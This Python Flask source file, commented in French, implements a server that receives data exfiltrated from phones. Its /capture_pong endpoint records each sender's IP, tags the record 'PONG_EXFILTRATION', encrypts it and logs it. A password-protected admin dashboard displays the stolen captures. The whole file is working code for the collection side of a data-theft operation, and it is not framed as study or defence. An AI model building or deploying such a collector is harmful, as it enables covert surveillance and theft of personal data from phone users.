from flask import Flask, render_template, request, redirect, url_for, session
import hmac
import json
import os
import secrets
import threading
from datetime import datetime
from cryptography.fernet import Fernet
from core.crypto_vault import CryptoVault

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 64 * 1024  # Refuse les requêtes > 64 Ko (code 413)
LOG_LOCK = threading.Lock()
DASHBOARD_LIMIT = 500  # Nombre max de lignes affichées sur le dashboard
# Clé de session : variable d'environnement, sinon aléatoire (sessions perdues au redémarrage)
app.secret_key = os.environ.get("WHS_SECRET_KEY") or secrets.token_hex(32)
vault = CryptoVault(key_file=os.environ.get("WHS_KEY_FILE"))  # Coffre-fort (clé chargée ou générée au premier usage)
LOG_FILE = os.environ.get("WHS_LOG_FILE") or os.path.join(BASE_DIR, "logs", "captures.json")

ADMIN_USER = os.environ.get("WHS_ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("WHS_ADMIN_PASSWORD")
if not ADMIN_PASSWORD:
    ADMIN_PASSWORD = secrets.token_urlsafe(12)
    print(f"[!] WHS_ADMIN_PASSWORD non défini. Mot de passe temporaire pour '{ADMIN_USER}' : {ADMIN_PASSWORD}")


def check_credentials(user, pw):
    """Comparaison en temps constant pour éviter les attaques temporelles."""
    if not user or not pw:
        return False
    return hmac.compare_digest(user, ADMIN_USER) and hmac.compare_digest(pw, ADMIN_PASSWORD)


def save_secure_capture(new_entry):
    """Ajoute une capture chiffrée en fin de log (une ligne = une entrée).

    On n'ajoute qu'une ligne : le coût reste constant même avec un très gros log,
    et une ligne abîmée n'empêche pas de lire les autres.
    """
    new_entry["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    token = Fernet(vault.key).encrypt(json.dumps(new_entry).encode())

    # Flask traite les requêtes en parallèle : une écriture à la fois.
    with LOG_LOCK:
        with open(LOG_FILE, "ab+") as file:
            # Un log de l'ancien format ne finit pas par un saut de ligne : on l'ajoute.
            file.seek(0, os.SEEK_END)
            if file.tell() > 0:
                file.seek(-1, os.SEEK_END)
                if file.read(1) != b"\n":
                    file.write(b"\n")
            file.write(token + b"\n")

    print("[+] Donnée sécurisée et stockée.")


def read_captures(limit=None):
    """Retourne (entrées les plus récentes en premier, nombre total d'entrées)."""
    if not os.path.exists(LOG_FILE):
        return [], 0

    with LOG_LOCK:
        with open(LOG_FILE, "rb") as file:
            lines = [line.strip() for line in file if line.strip()]

    fernet = Fernet(vault.key)
    total = 0
    decoded = []
    for line in lines:
        try:
            data = json.loads(fernet.decrypt(line))
        except Exception:
            continue  # ligne illisible (autre clé, fichier abîmé) : on l'ignore
        # Ancien format : tout le log dans un seul bloc chiffré contenant une liste
        entries = data if isinstance(data, list) else [data]
        total += len(entries)
        decoded.extend(entries)

    if limit is not None:
        decoded = decoded[-limit:]
    decoded.reverse()
    return decoded, total


@app.route('/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        if check_credentials(user, pw):
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
    return '''
        <form method="post" style="text-align:center; margin-top:100px;">
            <input type="text" name="username" placeholder="Admin User"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Connexion</button>
        </form>
    '''

@app.route('/')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    captures, total = read_captures(limit=DASHBOARD_LIMIT)
    return render_template('index.html', captures=captures, total=total)

@app.route('/capture_pong', methods=['POST'])
def capture_pong():
    # Récupération des données du téléphone
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        data = {"info": "Données brutes"}
    data["ip_origine"] = request.remote_addr

    # Sauvegarde chiffrée
    save_secure_capture({
        "type": "PONG_EXFILTRATION",
        "contenu": data
    })

    return "", 204


def run_server():
    """Démarre le serveur Flask en mode threadé."""
    port = int(os.environ.get("WHS_PORT", "5000"))
    app.run(host='127.0.0.1', port=port, debug=False, threaded=True)